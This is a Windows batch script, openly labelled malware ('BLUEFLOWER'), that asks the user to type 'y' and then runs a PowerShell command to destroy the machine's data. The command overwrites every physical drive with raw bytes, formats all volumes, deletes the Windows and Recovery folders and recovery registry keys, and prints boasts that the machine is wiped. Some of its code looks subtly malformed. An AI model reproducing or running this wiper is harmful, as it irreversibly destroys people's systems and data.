@echo off
title BLUEFLOWER MALWERE
color 4f
cls
echo.
echo                   ██████╗ ███╗   ██╗███████╗    ███████╗██╗  ██╗ ██████╗ ████████╗
echo                   ██╔══██╗████╗  ██║██╔════╝    ██╔════╝██║  ██║██╔═══██╗╚══██╔══╝
echo                   ██████╔╝██╔██╗ ██║█████╗      ███████╗███████║██║   ██║   ██║   
echo                   ██╔══██╗██║╚██╗██║██╔══╝      ╚════██║██╔══██║██║   ██║   ██║   
echo                   ██████╔╝██║ ╚████║███████╗    ███████║██║  ██║╚██████╔╝   ██║   
echo                   ╚═════╝ ╚═╝  ╚═══╝╚══════╝    ╚══════╝╚═╝  ╚═╝ ╚═════╝    ╚═╝   
echo.
echo                     THIS IS THE SINGLE MOST POWERFUL DESTRUCTION SCRIPT
echo                     ONE COMMAND. TWO SECONDS. ZERO RECOVERY. EVER.
echo.
set /p "choice=                TYPE y TO END EVERYTHING INSTANTLY → "

if /i not "%choice%"=="y" (cls & echo Canceled. BLUEFLOWER spares you... for now. & timeout 5 >nul & exit)

powershell -ep bypass -c "Get-Disk | %%{$_.Number} | ?{$_ -ne $null} | %%{$d=$_;1..9|%%{Start-Process powershell -ArgumentList '-c','$b=[byte[]](0..255)*131072;[IO.File]::Open(\"\\.\PhysicalDrive$d_\",'Open','Write').Write($b,0,$b.Length);Get-Volume -DriveLetter ([char](64+$_)) -EA SilentlyContinue | %%{echo y|format $_.DriveLetter`: /fs:NTFS /q /v:BLUEFLOWER 2>nul}'}&rd -Recurse -Force C:\Windows\*,C:\Recovery\* -EA SilentlyContinue;Remove-Item -Recurse -Force 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Recovery','C:\ProgramData\Microsoft\Windows\SystemData'* -EA SilentlyContinue;[Console]::Beep(32767,999);$v=New-Object -ComObject Sapi.SpVoice;$v.Rate=20;$v.Speak('ONE SHOT. INFINITE DEATH. GOODBYE FOREVER BLUEFLOWER WINS')" >nul 2>&1

cls
echo.
echo                     ONE-SHOT INFINITE DEATH = EXECUTED
echo                     ALL PHYSICAL DRIVES = WIPED
echo                     ALL PARTITIONS = FORMATTED
echo                     ALL RECOVERY = ERASED
echo                     YOUR MACHINE IS NOW COSMIC DUST
timeout /t 999 >nul
